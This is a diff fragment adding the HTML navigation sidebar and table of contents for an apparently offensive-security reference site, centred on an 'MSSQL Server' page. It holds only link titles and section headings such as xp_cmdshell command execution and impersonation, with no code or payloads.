+      <a href="../../Insecure%20Deserialization/Ruby/" class="md-nav__link">
+        Ruby Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_22" type="checkbox" id="__nav_22" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_22">
+          Insecure Direct Object References
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Direct Object References" data-md-level="1">
+        <label class="md-nav__title" for="__nav_22">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Direct Object References
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Direct%20Object%20References/" class="md-nav__link">
+        Insecure Direct Object References
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_23" type="checkbox" id="__nav_23" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_23">
+          Insecure Management Interface
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Management Interface" data-md-level="1">
+        <label class="md-nav__title" for="__nav_23">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Management Interface
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Management%20Interface/" class="md-nav__link">
+        Insecure management interface
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_24" type="checkbox" id="__nav_24" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_24">
+          Insecure Source Code Management
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Source Code Management" data-md-level="1">
+        <label class="md-nav__title" for="__nav_24">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Source Code Management
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Source%20Code%20Management/" class="md-nav__link">
+        Insecure source code management
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_25" type="checkbox" id="__nav_25" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_25">
+          JSON Web Token
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="JSON Web Token" data-md-level="1">
+        <label class="md-nav__title" for="__nav_25">
+          <span class="md-nav__icon md-icon"></span>
+          JSON Web Token
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JSON%20Web%20Token/" class="md-nav__link">
+        JWT - JSON Web Token
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_26" type="checkbox" id="__nav_26" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_26">
+          Java RMI
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Java RMI" data-md-level="1">
+        <label class="md-nav__title" for="__nav_26">
+          <span class="md-nav__icon md-icon"></span>
+          Java RMI
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%20RMI/" class="md-nav__link">
+        Java RMI
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_27" type="checkbox" id="__nav_27" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_27">
+          Kubernetes
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Kubernetes" data-md-level="1">
+        <label class="md-nav__title" for="__nav_27">
+          <span class="md-nav__icon md-icon"></span>
+          Kubernetes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Kubernetes/" class="md-nav__link">
+        Kubernetes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_28" type="checkbox" id="__nav_28" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_28">
+          LDAP Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="LDAP Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_28">
+          <span class="md-nav__icon md-icon"></span>
+          LDAP Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../LDAP%20Injection/" class="md-nav__link">
+        LDAP injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_29" type="checkbox" id="__nav_29" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_29">
+          LaTeX Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="LaTeX Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_29">
+          <span class="md-nav__icon md-icon"></span>
+          LaTeX Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../LaTeX%20Injection/" class="md-nav__link">
+        LaTex Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_30" type="checkbox" id="__nav_30" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_30">
+          Methodology and Resources
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Methodology and Resources" data-md-level="1">
+        <label class="md-nav__title" for="__nav_30">
+          <span class="md-nav__icon md-icon"></span>
+          Methodology and Resources
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Active%20Directory%20Attack/" class="md-nav__link">
+        Active Directory Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bind%20Shell%20Cheatsheet/" class="md-nav__link">
+        Bind Shell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cloud%20-%20AWS%20Pentest/" class="md-nav__link">
+        AWS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cloud%20-%20Azure%20Pentest/" class="md-nav__link">
+        Azure Active Directory
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
+        Cobalt Strike
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Container%20-%20Docker%20Pentest/" class="md-nav__link">
+        Docker Pentest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Escape%20Breakout/" class="md-nav__link">
+        Application Escape and Breakout
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Hash%20Cracking/" class="md-nav__link">
+        Hash Cracking
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Linux%20-%20Persistence/" class="md-nav__link">
+        Linux - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Linux%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Linux - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          MSSQL Server
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        MSSQL Server
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#identify-instances-and-databases" class="md-nav__link">
+    Identify Instances and Databases
+  </a>
+  
+    <nav class="md-nav" aria-label="Identify Instances and Databases">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discover-local-sql-server-instances" class="md-nav__link">
+    Discover Local SQL Server Instances
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discover-domain-sql-server-instances" class="md-nav__link">
+    Discover Domain SQL Server Instances
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discover-remote-sql-server-instances" class="md-nav__link">
+    Discover Remote SQL Server Instances
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identify-encrypted-databases" class="md-nav__link">
+    Identify Encrypted databases
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#version-query" class="md-nav__link">
+    Version Query
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#identify-sensitive-information" class="md-nav__link">
+    Identify Sensitive Information
+  </a>
+  
+    <nav class="md-nav" aria-label="Identify Sensitive Information">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#get-tables-from-a-specific-database" class="md-nav__link">
+    Get Tables from a Specific Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gather-5-entries-from-each-column" class="md-nav__link">
+    Gather 5 Entries from Each Column
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gather-5-entries-from-a-specific-table" class="md-nav__link">
+    Gather 5 Entries from a Specific Table
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dump-common-information-from-server-to-files" class="md-nav__link">
+    Dump common information from server to files
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#linked-database" class="md-nav__link">
+    Linked Database
+  </a>
+  
+    <nav class="md-nav" aria-label="Linked Database">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-trusted-link" class="md-nav__link">
+    Find Trusted Link
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#execute-query-through-the-link" class="md-nav__link">
+    Execute Query Through The Link
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#crawl-links-for-instances-in-the-domain" class="md-nav__link">
+    Crawl Links for Instances in the Domain
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#crawl-links-for-a-specific-instance" class="md-nav__link">
+    Crawl Links for a Specific Instance
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#query-version-of-linked-database" class="md-nav__link">
+    Query Version of Linked Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#execute-procedure-on-linked-database" class="md-nav__link">
+    Execute Procedure on Linked Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#determine-names-of-linked-databases" class="md-nav__link">
+    Determine Names of Linked Databases
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#determine-all-the-tables-names-from-a-selected-linked-database" class="md-nav__link">
+    Determine All the Tables Names from a Selected Linked Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gather-the-top-5-columns-from-a-selected-linked-table" class="md-nav__link">
+    Gather the Top 5 Columns from a Selected Linked Table
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gather-entries-from-a-selected-linked-column" class="md-nav__link">
+    Gather Entries from a Selected Linked Column
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-execution-via-xp_cmdshell" class="md-nav__link">
+    Command Execution via xp_cmdshell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extended-stored-procedure" class="md-nav__link">
+    Extended Stored Procedure
+  </a>
+  
+    <nav class="md-nav" aria-label="Extended Stored Procedure">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#add-the-extended-stored-procedure-and-list-extended-stored-procedures" class="md-nav__link">
+    Add the extended stored procedure and list extended stored procedures
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#clr-assemblies" class="md-nav__link">
+    CLR Assemblies
+  </a>
+  
+    <nav class="md-nav" aria-label="CLR Assemblies">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execute-commands-using-clr-assembly" class="md-nav__link">
+    Execute commands using CLR assembly
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#manually-creating-a-clr-dll-and-importing-it" class="md-nav__link">
+    Manually creating a CLR DLL and importing it
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ole-automation" class="md-nav__link">
+    OLE Automation
+  </a>
+  
+    <nav class="md-nav" aria-label="OLE Automation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execute-commands-using-ole-automation-procedures" class="md-nav__link">
+    Execute commands using OLE automation procedures
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#agent-jobs" class="md-nav__link">
+    Agent Jobs
+  </a>
+  
+    <nav class="md-nav" aria-label="Agent Jobs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execute-commands-through-sql-agent-job-service" class="md-nav__link">
+    Execute commands through SQL Agent Job service
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-all-jobs" class="md-nav__link">
+    List All Jobs
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#external-scripts" class="md-nav__link">
+    External Scripts
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#python" class="md-nav__link">
+    Python:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#r" class="md-nav__link">
+    R
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#audit-checks" class="md-nav__link">
+    Audit Checks
+  </a>
+  
+    <nav class="md-nav" aria-label="Audit Checks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-and-exploit-impersonation-opportunities" class="md-nav__link">
+    Find and exploit impersonation opportunities
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#find-databases-that-have-been-configured-as-trustworthy" class="md-nav__link">
+    Find databases that have been configured as trustworthy
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#manual-sql-server-queries" class="md-nav__link">
+    Manual SQL Server Queries
+  </a>
+  
+    <nav class="md-nav" aria-label="Manual SQL Server Queries">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#query-current-user-determine-if-the-user-is-a-sysadmin" class="md-nav__link">
+    Query Current User &amp; determine if the user is a sysadmin
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#current-role" class="md-nav__link">
+    Current Role
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#current-db" class="md-nav__link">
+    Current DB
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-all-tables" class="md-nav__link">
+    List all tables
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-all-databases" class="md-nav__link">
+    List all databases
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#all-logins-on-server" class="md-nav__link">
+    All Logins on Server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#all-database-users-for-a-database" class="md-nav__link">
+    All Database Users for a Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-all-sysadmins" class="md-nav__link">
+    List All Sysadmins
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-all-database-roles" class="md-nav__link">
+    List All Database Roles
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#effective-permissions-from-the-server" class="md-nav__link">
+    Effective Permissions from the Server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#effective-permissions-from-the-database" class="md-nav__link">
+    Effective Permissions from the Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-sql-server-logins-which-can-be-impersonated-for-the-current-database" class="md-nav__link">
+    Find SQL Server Logins Which can be Impersonated for the Current Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-impersonation" class="md-nav__link">
+    Exploiting Impersonation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-nested-impersonation" class="md-nav__link">
+    Exploiting Nested Impersonation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mssql-accounts-and-hashes" class="md-nav__link">
+    MSSQL Accounts and Hashes
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Metasploit%20-%20Cheatsheet/" class="md-nav__link">
+        Metasploit
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20enumeration/" class="md-nav__link">
+        Bug Hunting Methodology and Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Miscellaneous%20-%20Tricks/" class="md-nav__link">
+        Miscellaneous & Tricks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Network%20Discovery/" class="md-nav__link">
+        Network Discovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Network%20Pivoting%20Techniques/" class="md-nav__link">
+        Network Pivoting Techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Office%20-%20Attacks/" class="md-nav__link">
+        Office - Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Powershell%20-%20Cheatsheet/" class="md-nav__link">
+        Powershell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
+        Reverse Shell Cheat Sheet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Source%20Code%20Management/" class="md-nav__link">
+        Source Code Management
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Subdomains%20Enumeration/" class="md-nav__link">
+        Subdomains Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
+        AMSI Bypass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
+        Windows - Download and execute methods
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Mimikatz/" class="md-nav__link">
+        Windows - Mimikatz
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Persistence/" class="md-nav__link">
+        Windows - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Windows - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Using%20credentials/" class="md-nav__link">
+        Windows - Using credentials
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_31" type="checkbox" id="__nav_31" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_31">
+          NoSQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="NoSQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_31">
+          <span class="md-nav__icon md-icon"></span>
+          NoSQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../NoSQL%20Injection/" class="md-nav__link">
+        NoSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_32" type="checkbox" id="__nav_32" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_32">
+          OAuth
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="OAuth" data-md-level="1">
+        <label class="md-nav__title" for="__nav_32">
+          <span class="md-nav__icon md-icon"></span>
+          OAuth
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OAuth/" class="md-nav__link">
+        OAuth
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_33" type="checkbox" id="__nav_33" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_33">
+          Open Redirect
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Open Redirect" data-md-level="1">
+        <label class="md-nav__title" for="__nav_33">
+          <span class="md-nav__icon md-icon"></span>
+          Open Redirect
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Open%20Redirect/" class="md-nav__link">
+        Open URL Redirection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_34" type="checkbox" id="__nav_34" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_34">
+          Race Condition
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Race Condition" data-md-level="1">
+        <label class="md-nav__title" for="__nav_34">
+          <span class="md-nav__icon md-icon"></span>
+          Race Condition
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Race%20Condition/" class="md-nav__link">
+        Race Condition
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_35" type="checkbox" id="__nav_35" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_35">
+          Request Smuggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Request Smuggling" data-md-level="1">
+        <label class="md-nav__title" for="__nav_35">
+          <span class="md-nav__icon md-icon"></span>
+          Request Smuggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Request%20Smuggling/" class="md-nav__link">
+        Request Smuggling
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_36" type="checkbox" id="__nav_36" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_36">
+          SAML Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SAML Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_36">
+          <span class="md-nav__icon md-icon"></span>
+          SAML Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SAML%20Injection/" class="md-nav__link">
+        SAML Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_37" type="checkbox" id="__nav_37" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_37">
+          SQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_37">
+          <span class="md-nav__icon md-icon"></span>
+          SQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/" class="md-nav__link">
+        SQL injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/BigQuery%20Injection/" class="md-nav__link">
+        Google BigQuery SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/Cassandra%20Injection/" class="md-nav__link">
+        Cassandra Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/DB2%20Injection/" class="md-nav__link">
+        DB2 Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/HQL%20Injection/" class="md-nav__link">
+        Hibernate Query Language Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/MSSQL%20Injection/" class="md-nav__link">
+        MSSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
